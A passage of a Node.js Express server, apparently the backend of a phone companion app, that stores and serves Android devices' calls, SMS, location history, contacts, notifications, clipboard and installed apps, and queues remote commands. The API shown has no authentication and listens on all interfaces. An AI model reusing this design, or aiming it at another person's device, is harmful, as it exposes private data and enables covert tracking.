    case 'CALL_BLOCKLIST_RESULT': {
      const { deviceId, enabled, numbers } = payload;
      if (deviceId && numbers) {
        db.data.callBlocklist[deviceId] = { enabled: !!enabled, numbers };
        db.write();
      }
      broadcastToDashboard('CALL_BLOCKLIST_RESULT', payload);
      break;
    }

    default:
      console.warn(`[ws] unknown event: ${msg.event}`);
  }
}

app.get('/api/health', (req, res) => res.json({ ok: true }));

app.get('/api/devices', (req, res) => {
  res.json(
    db.data.devices.map((d) => ({
      id: d.id,
      name: d.deviceName,
      battery: d.battery,
      charging: d.isCharging,
      last_seen: d.lastSeen,
      online: devices.has(d.id) && devices.get(d.id).wsClientId != null
    }))
  );
});

app.get('/api/devices/:id/calls', (req, res) => {
  res.json(
    db.data.calls
      .filter((c) => c.deviceId === req.params.id)
      .sort((a, b) => b.timestamp - a.timestamp)
      .slice(0, 200)
      .map(({ deviceId, ...rest }) => rest)
  );
});

app.get('/api/devices/:id/messages', (req, res) => {
  const list = db.data.messages.filter((m) => m.deviceId === req.params.id);
  res.json(list.slice(-300).map(({ deviceId, ...rest }) => ({ ...rest, deviceId })));
});

app.get('/api/devices/:id/location', (req, res) => {
  const list = db.data.locations.filter((l) => l.deviceId === req.params.id);
  const latest = list[list.length - 1];
  res.json(
    latest
      ? {
          latitude: latest.latitude,
          longitude: latest.longitude,
          accuracy: latest.accuracy,
          speed: latest.speed,
          altitude: latest.altitude,
          bearing: latest.bearing,
          timestamp: latest.timestamp
        }
      : null
  );
});

app.get('/api/devices/:id/location/history', (req, res) => {
  const limit = Math.min(2000, Number(req.query.limit) || 500);
  const list = db.data.locations
    .filter((l) => l.deviceId === req.params.id)
    .slice(-limit);
  res.json(list);
});

app.delete('/api/devices/:id/location/history', (req, res) => {
  const deviceId = req.params.id;
  db.data.locations = db.data.locations.filter((l) => l.deviceId !== deviceId);
  db.write();
  broadcastToDashboard('LOCATIONS_CLEARED', { deviceId });
  res.json({ success: true, message: 'Location history cleared' });
});

app.get('/api/devices/:id/notifications', (req, res) => {
  res.json(
    db.data.notifications
      .filter((n) => n.deviceId === req.params.id)
      .slice(-200)
      .reverse()
  );
});

// FEATURE A: contacts list for a device.
app.get('/api/devices/:id/contacts', (req, res) => {
  res.json(
    (db.data.contacts || [])
      .filter((c) => c.deviceId === req.params.id)
      .slice(0, 2000)
  );
});

// Round 3 telemetry GET endpoints
app.get('/api/devices/:id/info', (req, res) => {
  res.json(db.data.deviceInfo[req.params.id] || null);
});

app.get('/api/devices/:id/apps', (req, res) => {
  res.json(db.data.installedApps[req.params.id] || []);
});

app.get('/api/devices/:id/wifi', (req, res) => {
  res.json(db.data.wifi[req.params.id] || null);
});

app.get('/api/devices/:id/clipboard', (req, res) => {
  res.json((db.data.clipboardHistory || []).filter((c) => c.deviceId === req.params.id));
});

app.get('/api/devices/:id/blocklist', (req, res) => {
  res.json(db.data.callBlocklist[req.params.id] || { enabled: false, numbers: [] });
});

app.get('/api/devices/:id/cellular', (req, res) => {
  res.json((db.data.cellular && db.data.cellular[req.params.id]) || null);
});

app.get('/api/devices/:id/dnd', (req, res) => {
  res.json((db.data.dnd && db.data.dnd[req.params.id]) || null);
});

app.get('/api/devices/:id/sync-config', (req, res) => {
  res.json(
    (db.data.syncConfig && db.data.syncConfig[req.params.id]) || {
      deviceId: req.params.id,
      notifications: true,
      calls: true,
      sms: true,
      location: true,
      clipboard: true,
      recordings: true,
      telemetry: true,
      lowDataMode: false
    }
  );
});

// BUG 5: remove a device (e.g. stale duplicates from BUG 1) + its history.
app.delete('/api/devices/:id', async (req, res) => {
  const id = req.params.id;
  const before = db.data.devices.length;
  db.data.devices = db.data.devices.filter((d) => d.id !== id && d.deviceId !== id);
  db.data.calls = db.data.calls.filter((c) => c.deviceId !== id);
  db.data.messages = db.data.messages.filter((m) => m.deviceId !== id);
  db.data.locations = db.data.locations.filter((l) => l.deviceId !== id);
  db.data.notifications = db.data.notifications.filter((n) => n.deviceId !== id);
  if (Array.isArray(db.data.contacts)) db.data.contacts = db.data.contacts.filter((c) => c.deviceId !== id);
  delete db.data.deviceInfo[id];
  delete db.data.installedApps[id];
  delete db.data.wifi[id];
  delete db.data.callBlocklist[id];
  db.data.clipboardHistory = db.data.clipboardHistory.filter((c) => c.deviceId !== id);
  db.data.commandQueue = db.data.commandQueue.filter((q) => q.deviceId !== id);
  devices.delete(id);
  await db.write();
  broadcastToDashboard('DEVICE_REMOVED', { deviceId: id });
  console.log(`[device] removed ${id} (${before - db.data.devices.length} record(s))`);
  res.json({ success: true, removed: before - db.data.devices.length });
});

app.post('/api/command/:name', async (req, res) => {
  const { deviceId } = req.body || {};
  if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId is required' });

  const event = COMMAND_EVENTS[req.params.name];
  if (!event) {
    return res.status(404).json({ success: false, error: `Unknown command: ${req.params.name}` });
  }

  const isOnline = devices.has(deviceId) && devices.get(deviceId).wsClientId != null;
  if (!isOnline) {
    db.data.commandQueue.push({
      id: randomUUID(),
      deviceId,
      command: req.params.name,
      payload: req.body,
      timestamp: Date.now()
    });
    await db.write();
    console.log(`[command] queued offline command ${req.params.name} for ${deviceId}`);
    return res.json({ success: true, queued: true });
  }

  if (req.params.name === 'sync-config') {
    if (!db.data.syncConfig) db.data.syncConfig = {};
    const existing = db.data.syncConfig[deviceId] || {};
    db.data.syncConfig[deviceId] = {
      deviceId,
      notifications: req.body.notifications !== undefined ? Boolean(req.body.notifications) : (existing.notifications !== false),
      calls: req.body.calls !== undefined ? Boolean(req.body.calls) : (existing.calls !== false),
      sms: req.body.sms !== undefined ? Boolean(req.body.sms) : (existing.sms !== false),
      location: req.body.location !== undefined ? Boolean(req.body.location) : (existing.location !== false),
      clipboard: req.body.clipboard !== undefined ? Boolean(req.body.clipboard) : (existing.clipboard !== false),
      recordings: req.body.recordings !== undefined ? Boolean(req.body.recordings) : (existing.recordings !== false),
      telemetry: req.body.telemetry !== undefined ? Boolean(req.body.telemetry) : (existing.telemetry !== false),
      lowDataMode: req.body.lowDataMode !== undefined ? Boolean(req.body.lowDataMode) : Boolean(existing.lowDataMode)
    };
    await db.write();
    broadcastToDashboard('SYNC_CONFIG_STATUS', db.data.syncConfig[deviceId]);
  }

  sendToDevice(deviceId, event, commandPayload(req.params.name, req.body));
  res.json({ success: true });
});

if (existsSync(distPath)) {
  app.get('*', (req, res, next) => {
    if (req.path.startsWith('/api')) return next();
    res.sendFile(join(distPath, 'index.html'));
  });
}

httpServer.listen(5000, '0.0.0.0', () => {
  const ip = getLocalIP();
  console.log(`

====================================
  Phone Link Server
  Local:    http://localhost:5000
  Network:  http://${ip}:5000

  In the Android app connect to: ${ip}
====================================
`);
});
